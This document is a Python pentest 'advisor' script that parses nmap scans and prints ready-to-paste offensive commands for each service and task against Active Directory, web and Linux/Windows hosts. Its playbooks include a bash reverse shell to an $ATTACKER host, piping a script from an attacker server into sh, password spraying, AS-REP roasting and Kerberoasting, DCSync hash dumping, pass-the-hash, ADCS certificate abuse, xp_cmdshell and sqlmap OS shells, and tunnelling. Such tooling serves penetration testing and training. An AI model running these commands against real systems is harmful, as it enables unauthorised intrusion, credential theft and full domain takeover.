#!/usr/bin/env python3
"""
advisor - offline pentest methodology + command engine

One knowledge base, three ways in:

    python3 advisor.py --scan nmap.txt        # parse a scan -> per-service methodology
    python3 advisor.py --service smb          # one service's playbook on demand
    python3 advisor.py --task kerberoast      # how to do a specific thing
    python3 advisor.py --list                 # everything it knows

It fills placeholders so commands come out ready to paste:

    python3 advisor.py --scan nmap.txt --ip 10.10.10.10 --domain corp.local --dc 10.10.10.10

Design goal: it explains the WHY, not just the command, so using it trains your
methodology instead of replacing it. Commands assume a Kali-style toolset
(netexec/nxc, impacket, enum4linux-ng, ffuf, kerbrute, certipy, bloodhound-python).

No third-party deps. Pure stdlib.
"""

import sys
import re
import argparse

# --------------------------------------------------------------------------- #
class C:
    on = sys.stdout.isatty()
    def _w(code):
        return (lambda s: f"\033[{code}m{s}\033[0m" if C.on else s)
    bold = staticmethod(_w("1"))
    red  = staticmethod(_w("31"))
    grn  = staticmethod(_w("32"))
    ylw  = staticmethod(_w("33"))
    blu  = staticmethod(_w("34"))
    cyn  = staticmethod(_w("36"))
    dim  = staticmethod(_w("2"))

# target variables, overridden by flags; left literal if not supplied
VARS = {"$IP": "$IP", "$DOMAIN": "$DOMAIN", "$DC": "$DC", "$USER": "$USER",
        "$PASS": "$PASS", "$URL": "$URL", "$ATTACKER": "$ATTACKER",
        "$WORDLIST": "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"}

def sub(cmd):
    for k, v in VARS.items():
        cmd = cmd.replace(k, v)
    return cmd


# --------------------------------------------------------------------------- #
#  SERVICE PLAYBOOKS
#  matched by port first, service-name keyword second.
#  why  = plain-language what to check and the reasoning
#  cmds = (label, command) with $VARS
# --------------------------------------------------------------------------- #
SERVICES = [
    {"ports": [21], "names": ["ftp"], "title": "FTP (21)",
     "why": "Check anonymous login first, it is free and common. If you get in, "
            "download everything, config and source files leak creds. Note the "
            "banner version for known backdoors/CVEs.",
     "cmds": [("anon login", "ftp $IP        # user: anonymous  pass: anonymous"),
              ("nmap scripts", "nmap -p21 --script ftp-anon,ftp-vsftpd-backdoor $IP"),
              ("mirror everything", "wget -r ftp://anonymous:anonymous@$IP/")]},

    {"ports": [22], "names": ["ssh"], "title": "SSH (22)",
     "why": "Rarely the way in without creds or a key. Note the version for CVEs. "
            "If you find an id_rsa anywhere, this is where it goes. Bruteforce is a "
            "last resort and noisy.",
     "cmds": [("login", "ssh $USER@$IP"),
              ("with a found key", "chmod 600 id_rsa && ssh -i id_rsa $USER@$IP"),
              ("brute (last resort)", "hydra -L users.txt -P rockyou.txt ssh://$IP")]},

    {"ports": [25, 587], "names": ["smtp"], "title": "SMTP (25/587)",
     "why": "Mail server. Main offensive use is username enumeration via VRFY/RCPT, "
            "which builds a user list for spraying/roasting.",
     "cmds": [("enum users", "smtp-user-enum -M VRFY -U users.txt -t $IP"),
              ("nmap scripts", "nmap -p25 --script smtp-commands,smtp-enum-users $IP"),
              ("manual", "nc $IP 25   then: VRFY root")]},

    {"ports": [53], "names": ["dns", "domain"], "title": "DNS (53)",
     "why": "Try a zone transfer, it can dump every host in the domain. On an AD box "
            "DNS usually sits on the DC, so port 53 open + 88 open = you found the DC.",
     "cmds": [("zone transfer", "dig axfr @$IP $DOMAIN"),
              ("enum", "dnsenum --dnsserver $IP $DOMAIN"),
              ("reverse", "dig -x $IP @$IP")]},

    {"ports": [80, 443, 8080, 8000], "names": ["http", "https"], "title": "HTTP/HTTPS (80/443/...)",
     "why": "Almost always the biggest attack surface. Fingerprint it, read the "
            "source and robots.txt, brute directories AND vhosts, try default creds. "
            "Do not skip vhost fuzzing on AD/CTF boxes, apps often hide behind a Host header.",
     "cmds": [("fingerprint", "whatweb http://$IP ; nikto -h http://$IP"),
              ("dir brute", "feroxbuster -u http://$IP -w $WORDLIST -x php,txt,html"),
              ("ffuf dirs", "ffuf -u http://$IP/FUZZ -w $WORDLIST -ic -c"),
              ("vhost fuzz", "ffuf -u http://$IP -H 'Host: FUZZ.$DOMAIN' -w subdomains.txt -fs 0"),
              ("check basics", "curl -s http://$IP/robots.txt ; view-source")]},

    {"ports": [88], "names": ["kerberos", "kerberos-sec"], "title": "Kerberos (88)  --> DOMAIN CONTROLLER",
     "why": "Port 88 means Active Directory. This is a DC. Grab the domain name (from "
            "nmap, ldap, or the cert on 636), then you can enumerate users with no creds "
            "and AS-REP roast anyone with pre-auth disabled. Fix your clock first, Kerberos "
            "fails on skew.",
     "cmds": [("sync clock", "sudo ntpdate $IP        # or faketime, Kerberos hates skew"),
              ("user enum (no creds)", "kerbrute userenum -d $DOMAIN --dc $DC users.txt"),
              ("AS-REP roast (no creds)", "GetNPUsers.py $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $DC")]},

    {"ports": [110, 143, 993, 995], "names": ["pop3", "imap"], "title": "POP3/IMAP (110/143)",
     "why": "Mailbox access. Useless without creds, gold once you have them, read the "
            "mail for more creds and internal info.",
     "cmds": [("login", "nc $IP 110   then: USER x / PASS y"),
              ("with creds", "python3 -c 'import imaplib; ...'  or use evolution/thunderbird")]},

    {"ports": [111, 2049], "names": ["rpcbind", "nfs"], "title": "RPC/NFS (111/2049)",
     "why": "List NFS exports, then mount them. Misconfigured exports let you read (or "
            "write) files as any UID, which is a classic privesc route.",
     "cmds": [("list exports", "showmount -e $IP"),
              ("mount", "sudo mount -t nfs $IP:/share /mnt/x -o nolock"),
              ("uid abuse", "if root_squash is off, create a SUID binary as your fake root")]},

    {"ports": [135, 139], "names": ["msrpc", "netbios-ssn"], "title": "MSRPC/NetBIOS (135/139)",
     "why": "MSRPC can be queried for users with a null session. Often paired with 445.",
     "cmds": [("rpc null session", "rpcclient -U '' -N $IP   then: enumdomusers"),
              ("dump endpoints", "rpcdump.py $IP")]},

    {"ports": [445], "names": ["smb", "microsoft-ds"], "title": "SMB (445)  [do all of this]",
     "why": "The richest AD service. Work it fully: null/guest session, list shares and "
            "spider them, enumerate users, and READ USER DESCRIPTIONS, passwords get left "
            "in the description field constantly. RID-cycle to build a user list even when "
            "anonymous enum is locked down.",
     "cmds": [("null session", "nxc smb $IP -u '' -p ''"),
              ("full auto enum", "enum4linux-ng -A $IP"),
              ("list shares", "nxc smb $IP -u '' -p '' --shares   ;  smbclient -L //$IP/ -N"),
              ("users + descriptions", "nxc smb $IP -u guest -p '' --users        # descriptions leak passwords"),
              ("RID cycle -> users", "nxc smb $IP -u guest -p '' --rid-brute"),
              ("spider a share", "smbclient //$IP/share -N   then: recurse ON; prompt OFF; mget *")]},

    {"ports": [161], "names": ["snmp"], "title": "SNMP (161/udp)",
     "why": "Often forgotten because it is UDP. The 'public' community string leaks "
            "processes, users, installed software, sometimes creds in process args.",
     "cmds": [("guess community", "onesixtyone -c /usr/share/seclists/.../snmp.txt $IP"),
              ("walk it", "snmpwalk -v2c -c public $IP"),
              ("juicy bits", "snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.4.2.1.2   # process args")]},

    {"ports": [389, 636, 3268, 3269], "names": ["ldap", "ldapssl", "globalcatalog"], "title": "LDAP (389/636/3268)  --> DC",
     "why": "Anonymous bind may dump the whole directory, users, groups, and description "
            "fields (creds again). Pull the naming context first, then enumerate. The cert "
            "on 636 often reveals the domain FQDN.",
     "cmds": [("naming context", "ldapsearch -x -H ldap://$IP -s base namingcontexts"),
              ("anon dump users", "ldapsearch -x -H ldap://$IP -b 'DC=$DOMAIN' '(objectClass=user)'"),
              ("descriptions", "ldapsearch -x -H ldap://$IP -b 'DC=$DOMAIN' | grep -i descr"),
              ("with creds", "nxc ldap $DC -u $USER -p $PASS --users")]},

    {"ports": [1433], "names": ["mssql", "ms-sql-s"], "title": "MSSQL (1433)",
     "why": "If you get creds, you often get code exec via xp_cmdshell. Try Windows auth "
            "with domain creds. Also a place to steal a NetNTLM hash via xp_dirtree.",
     "cmds": [("connect", "mssqlclient.py $DOMAIN/$USER:$PASS@$IP -windows-auth"),
              ("code exec", "enable_xp_cmdshell   then: xp_cmdshell whoami"),
              ("test creds", "nxc mssql $IP -u $USER -p $PASS")]},

    {"ports": [3306], "names": ["mysql"], "title": "MySQL (3306)",
     "why": "Check for weak/blank root creds. Read app databases for user hashes.",
     "cmds": [("connect", "mysql -h $IP -u root -p"),
              ("test", "nxc mysql $IP -u root -p ''"),
              ("dump", "select * from mysql.user;   then loot app DBs")]},

    {"ports": [3389], "names": ["rdp", "ms-wbt-server"], "title": "RDP (3389)",
     "why": "Interactive access once you have creds. Also useful to confirm creds work "
            "before doing anything noisier.",
     "cmds": [("connect", "xfreerdp /u:$USER /p:$PASS /v:$IP /cert:ignore +clipboard"),
              ("test creds", "nxc rdp $IP -u $USER -p $PASS")]},

    {"ports": [5985, 5986], "names": ["winrm", "wsman"], "title": "WinRM (5985/5986)",
     "why": "The cleanest remote shell on Windows if the user is in Remote Management "
            "Users. Test creds first, then drop into a shell.",
     "cmds": [("test creds", "nxc winrm $IP -u $USER -p $PASS"),
              ("shell", "evil-winrm -i $IP -u $USER -p $PASS"),
              ("with a hash (PTH)", "evil-winrm -i $IP -u $USER -H <NThash>")]},

    {"ports": [5432], "names": ["postgresql", "postgres"], "title": "PostgreSQL (5432)",
     "why": "Weak creds are common. Can lead to file read/write and code exec.",
     "cmds": [("connect", "psql -h $IP -U postgres"),
              ("test", "nxc postgres $IP -u postgres -p postgres")]},

    {"ports": [6379], "names": ["redis"], "title": "Redis (6379)",
     "why": "Frequently unauthenticated. Read all keys; can escalate to webshell write or "
            "SSH key write if you can reach a writable path.",
     "cmds": [("connect", "redis-cli -h $IP"),
              ("enum", "redis-cli -h $IP INFO ; redis-cli -h $IP KEYS '*'")]},
]


# --------------------------------------------------------------------------- #
#  TASK PLAYBOOKS  ("how do I do X")
# --------------------------------------------------------------------------- #
TASKS = [
    {"keys": ["nmap", "portscan", "nmap-full"], "title": "Full nmap methodology",
     "why": "All ports first (fast), then deep scan only the open ones. Never -sV every "
            "port, it wastes time. Do a quick UDP top-ports too.",
     "cmds": [("all TCP ports fast", "nmap -p- --min-rate 5000 -oN allports $IP"),
              ("deep on open ports", "nmap -sC -sV -p<comma,sep,ports> -oN scan $IP"),
              ("top UDP", "sudo nmap -sU --top-ports 20 -oN udp $IP")]},

    {"keys": ["ffuf", "dir", "dirbrute", "gobuster", "feroxbuster"], "title": "Web content discovery",
     "why": "Brute directories AND files with extensions. Filter noise by response size "
            "or code once you see the pattern. Recurse into what you find.",
     "cmds": [("ffuf dirs+files", "ffuf -u http://$IP/FUZZ -w $WORDLIST -e .php,.txt,.html -ic -c"),
              ("feroxbuster (recursive)", "feroxbuster -u http://$IP -w $WORDLIST -x php,txt"),
              ("gobuster", "gobuster dir -u http://$IP -w $WORDLIST -x php,txt"),
              ("filter noise", "add -fc 404  or  -fs <size>  to ffuf once you see the baseline")]},

    {"keys": ["vhost", "subdomain"], "title": "Vhost / subdomain fuzzing",
     "why": "Many boxes serve a different app on a vhost. Add the domain to /etc/hosts, "
            "then fuzz the Host header and filter by the default page size.",
     "cmds": [("fuzz vhosts", "ffuf -u http://$IP -H 'Host: FUZZ.$DOMAIN' -w subdomains.txt -fs 0"),
              ("add hosts", "echo '$IP  $DOMAIN app.$DOMAIN' | sudo tee -a /etc/hosts")]},

    {"keys": ["smb-enum", "smb"], "title": "SMB enumeration (no creds -> creds)",
     "why": "Order: null session, shares, users, descriptions, RID cycle. The description "
            "field and readable shares are where creds hide.",
     "cmds": [("null", "nxc smb $IP -u '' -p ''"),
              ("shares", "nxc smb $IP -u guest -p '' --shares"),
              ("users+desc", "nxc smb $IP -u guest -p '' --users"),
              ("rid brute", "nxc smb $IP -u guest -p '' --rid-brute"),
              ("full", "enum4linux-ng -A $IP")]},

    {"keys": ["asrep", "asreproast", "getnpusers"], "title": "AS-REP roasting",
     "why": "Works with NO creds if you have a user list. Targets accounts with "
            "'do not require pre-auth'. Crack the $krb5asrep$ output offline (hashcat -m 18200).",
     "cmds": [("no creds", "GetNPUsers.py $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $DC"),
              ("with creds (all)", "GetNPUsers.py $DOMAIN/$USER:$PASS -request -dc-ip $DC"),
              ("crack", "hashcat -m 18200 hash.txt rockyou.txt")]},

    {"keys": ["kerberoast", "getuserspn", "spn"], "title": "Kerberoasting",
     "why": "Needs ANY valid domain user. Requests service tickets for accounts with an "
            "SPN; those accounts' passwords are often weak. Crack $krb5tgs$ offline (-m 13100). "
            "No lockout risk, it is all offline after the request.",
     "cmds": [("roast", "GetUserSPNs.py $DOMAIN/$USER:$PASS -dc-ip $DC -request"),
              ("crack", "hashcat -m 13100 hash.txt rockyou.txt")]},

    {"keys": ["kerbrute", "userenum"], "title": "User enumeration with kerbrute",
     "why": "Fast, quiet, no-creds user validation against Kerberos. Builds the list you "
            "feed to AS-REP roasting and spraying.",
     "cmds": [("enum", "kerbrute userenum -d $DOMAIN --dc $DC users.txt"),
              ("spray", "kerbrute passwordspray -d $DOMAIN --dc $DC users.txt 'Password123!'")]},

    {"keys": ["spray", "password-spray"], "title": "Password spraying",
     "why": "One password against many users beats many passwords against one (avoids "
            "lockout). Check the lockout policy first. Season+year and Company123 are the "
            "classic guesses.",
     "cmds": [("check policy", "nxc smb $DC -u $USER -p $PASS --pass-pol"),
              ("spray smb", "nxc smb $DC -u users.txt -p 'Autumn2024!' --continue-on-success"),
              ("spray kerbrute", "kerbrute passwordspray -d $DOMAIN --dc $DC users.txt 'Autumn2024!'")]},

    {"keys": ["secretsdump", "dcsync", "ntds"], "title": "Dump hashes (secretsdump / DCSync)",
     "why": "With DA or replication rights, pull every hash from the DC (DCSync). With "
            "local admin on a host, dump its SAM. Then pass-the-hash.",
     "cmds": [("dcsync (all domain)", "secretsdump.py $DOMAIN/$USER:$PASS@$DC -just-dc"),
              ("local SAM", "secretsdump.py $DOMAIN/$USER:$PASS@$IP"),
              ("from a hash", "secretsdump.py $DOMAIN/$USER@$DC -hashes :<NThash>")]},

    {"keys": ["bloodhound"], "title": "BloodHound collection",
     "why": "Collect the graph early once you have any creds. It finds the path to DA you "
            "would miss by hand, ACL abuse, nested groups, kerberoastable admins.",
     "cmds": [("python collector", "bloodhound-python -u $USER -p $PASS -d $DOMAIN -ns $DC -c all"),
              ("via nxc", "nxc ldap $DC -u $USER -p $PASS --bloodhound --collection All -ns $DC")]},

    {"keys": ["gpp", "cpassword"], "title": "GPP cpassword (SYSVOL)",
     "why": "Old Groups.xml in SYSVOL stores an AES-encrypted password with a key "
            "Microsoft published. Decrypt, do not crack.",
     "cmds": [("hunt", "nxc smb $DC -u $USER -p $PASS -M gpp_password"),
              ("manual", "smbclient //$DC/SYSVOL -U $USER   then find Groups.xml"),
              ("decrypt", "gpp-decrypt '<cpassword>'")]},

    {"keys": ["adcs", "certipy", "esc"], "title": "ADCS abuse (certificates)",
     "why": "Misconfigured cert templates (ESC1-ESC8) let a low-priv user get a cert as "
            "an admin. certipy finds and exploits them.",
     "cmds": [("find vulns", "certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -vulnerable -stdout"),
              ("ESC1 example", "certipy req -u $USER@$DOMAIN -p $PASS -ca <CA> -template <tmpl> -upn administrator@$DOMAIN"),
              ("auth with cert", "certipy auth -pfx administrator.pfx -dc-ip $DC")]},

    {"keys": ["linux-privesc", "linpeas", "privesc-linux"], "title": "Linux privesc enumeration",
     "why": "Run the automated script, but always check the quick wins by hand: sudo -l, "
            "SUID binaries, cron, writable paths, capabilities. GTFOBins for anything you find.",
     "cmds": [("automated", "curl -s <attacker>/linpeas.sh | sh   # or scp it over"),
              ("sudo rights", "sudo -l"),
              ("SUID", "find / -perm -4000 -type f 2>/dev/null"),
              ("capabilities", "getcap -r / 2>/dev/null")]},

    {"keys": ["windows-privesc", "winpeas", "privesc-windows"], "title": "Windows privesc enumeration",
     "why": "Check your privileges first, SeImpersonate is an instant win with a potato. "
            "Then run winPEAS. Look for stored creds, unquoted service paths, AlwaysInstallElevated.",
     "cmds": [("privileges", "whoami /priv"),
              ("SeImpersonate -> SYSTEM", "PrintSpoofer.exe -i -c cmd   (or GodPotato)"),
              ("automated", "winPEASx64.exe"),
              ("stored creds", "cmdkey /list ; reg query HKLM /f password /t REG_SZ /s")]},

    {"keys": ["pivot", "chisel", "ligolo"], "title": "Pivoting to an internal network",
     "why": "Once you own a dual-homed host, tunnel through it to reach the internal "
            "subnet. Ligolo-ng is the cleanest; chisel is the fallback.",
     "cmds": [("ligolo (attacker)", "ligolo-proxy -selfcert   then: ifconfig/route add for the subnet"),
              ("ligolo (victim)", "./agent -connect $ATTACKER:11601 -ignore-cert"),
              ("chisel (attacker)", "./chisel server -p 8000 --reverse"),
              ("chisel (victim)", "./chisel client $ATTACKER:8000 R:socks   then proxychains")]},

    {"keys": ["revshell", "reverse-shell", "shell"], "title": "Reverse shell + stabilise",
     "why": "Catch it on a common port (443/80 blend in). Then upgrade to a proper PTY, "
            "a raw shell has no tab-complete, no Ctrl-C, and dies easily.",
     "cmds": [("listener", "nc -lvnp 443   (or rlwrap nc -lvnp 443)"),
              ("bash", "bash -i >& /dev/tcp/$ATTACKER/443 0>&1"),
              ("upgrade to PTY", "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'  then: Ctrl-Z; stty raw -echo; fg; export TERM=xterm"),
              ("more payloads", "revshells.com for every language/OS")]},

    {"keys": ["sqli", "sqlmap"], "title": "SQL injection with sqlmap",
     "why": "Confirm the injection point, then let sqlmap enumerate. Save the request from "
            "Burp for complex/POST cases.",
     "cmds": [("basic", "sqlmap -u 'http://$IP/page?id=1' --batch --dbs"),
              ("from a request", "sqlmap -r request.txt --batch --dump"),
              ("os shell", "sqlmap -u '...' --os-shell")]},
]


# --------------------------------------------------------------------------- #
def parse_nmap(text):
    """Pull (port, proto, service, banner) from -oN/normal or greppable output."""
    found = []
    for line in text.splitlines():
        # normal:  22/tcp   open  ssh     OpenSSH 8.2
        m = re.match(r'^\s*(\d+)/(tcp|udp)\s+open\s+(\S+)\s*(.*)$', line)
        if m:
            found.append((int(m.group(1)), m.group(2), m.group(3), m.group(4).strip()))
            continue
        # greppable: Ports: 22/open/tcp//ssh//OpenSSH...
        for pm in re.finditer(r'(\d+)/open/(tcp|udp)/[^/]*/([^/]+)/', line):
            found.append((int(pm.group(1)), pm.group(2), pm.group(3), ""))
    # dedupe by port
    seen, out = set(), []
    for p in found:
        if p[0] not in seen:
            seen.add(p[0])
            out.append(p)
    return out


def find_service(port, name):
    for s in SERVICES:
        if port in s["ports"]:
            return s
    for s in SERVICES:
        if any(n in name.lower() for n in s["names"]):
            return s
    return None


def print_service(s):
    print(f"\n{C.bold(C.cyn('### ' + s['title']))}")
    print(f"  {s['why']}")
    for label, cmd in s["cmds"]:
        print(f"    {C.blu('$')} {C.grn(sub(cmd)):70} {C.dim('# '+label)}")


def print_task(t):
    print(f"\n{C.bold(C.cyn('### ' + t['title']))}")
    print(f"  {t['why']}")
    for label, cmd in t["cmds"]:
        print(f"    {C.blu('$')} {C.grn(sub(cmd)):70} {C.dim('# '+label)}")


def advise_scan(ports):
    portset = {p for p, _, _, _ in ports}
    is_dc = 88 in portset and (389 in portset or 3268 in portset or 445 in portset)
    print(C.bold(f"\n== advisor: {len(ports)} open port(s) =="))
    if is_dc:
        print(C.bold(C.red("\n*** ACTIVE DIRECTORY DOMAIN CONTROLLER ***")))
        print("  Kerberos(88)+LDAP/SMB = a DC. Recommended order:")
        print("    1. Get the domain FQDN (ldap namingcontexts, or the cert on 636).")
        print("    2. SMB/LDAP null session -> users + descriptions (creds hide there).")
        print("    3. RID-cycle or kerbrute to build a user list.")
        print("    4. AS-REP roast the list (no creds needed).")
        print("    5. Spray a weak password (mind lockout).")
        print("    6. Any valid creds -> BloodHound + Kerberoast.")
        print("    7. Path to DA -> secretsdump -just-dc -> pass-the-hash.")
        print(C.dim("    (advisor.py --task asrep | kerberoast | bloodhound | secretsdump for each step)"))
    shown = set()
    for port, proto, name, banner in sorted(ports):
        s = find_service(port, name)
        b = f"   {C.dim(banner)}" if banner else ""
        if not s:
            print(f"\n{C.bold(C.ylw(f'### {port}/{proto} {name}'))}{b}")
            print(C.dim("  No playbook yet. Try: searchsploit, nmap --script, or google the banner."))
            continue
        if s["title"] in shown:
            continue
        shown.add(s["title"])
        print_service(s)
        if banner:
            print(f"    {C.dim('banner: '+banner+'  -> check searchsploit for this version')}")


def find_task(name):
    n = name.lower()
    for t in TASKS:
        if n in t["keys"]:
            return t
    for t in TASKS:
        if any(n in k or k in n for k in t["keys"]):
            return t
    return None


def list_all():
    print(C.bold("\nServices (advisor.py --service <name>):"))
    for s in SERVICES:
        print(f"  {C.grn(str(s['ports'])[1:-1]):22} {s['title']}")
    print(C.bold("\nTasks (advisor.py --task <name>):"))
    for t in TASKS:
        print(f"  {C.grn(t['keys'][0]):22} {t['title']}")
    print()


# --------------------------------------------------------------------------- #
def main():
    ap = argparse.ArgumentParser(description="offline pentest methodology + command engine")
    ap.add_argument("--scan", help="nmap output file to analyse (or - for stdin)")
    ap.add_argument("--service", help="print one service playbook, e.g. --service smb")
    ap.add_argument("--task", help="print a task playbook, e.g. --task kerberoast")
    ap.add_argument("--list", action="store_true", help="list all services and tasks")
    ap.add_argument("--ip"); ap.add_argument("--domain"); ap.add_argument("--dc")
    ap.add_argument("--user"); ap.add_argument("--password", dest="pw")
    ap.add_argument("--attacker"); ap.add_argument("--no-color", action="store_true")
    args = ap.parse_args()

    if args.no_color:
        C.on = False
    for flag, key in [(args.ip, "$IP"), (args.domain, "$DOMAIN"), (args.dc, "$DC"),
                      (args.user, "$USER"), (args.pw, "$PASS"), (args.attacker, "$ATTACKER")]:
        if flag:
            VARS[key] = flag

    if args.list:
        list_all(); return
    if args.service:
        s = find_service(-1, args.service)
        print_service(s) if s else print(f"No service playbook for '{args.service}'. Try --list.")
        print(); return
    if args.task:
        t = find_task(args.task)
        print_task(t) if t else print(f"No task playbook for '{args.task}'. Try --list.")
        print(); return
    if args.scan:
        text = sys.stdin.read() if args.scan == "-" else open(args.scan, errors="replace").read()
        advise_scan(parse_nmap(text)); print(); return
    ap.print_help()


if __name__ == "__main__":
    try:
        import signal
        if hasattr(signal, "SIGPIPE"):
            signal.signal(signal.SIGPIPE, signal.SIG_DFL)
    except Exception:
        pass
    try:
        main()
    except BrokenPipeError:
        try:
            sys.stdout.close()
        except Exception:
            pass
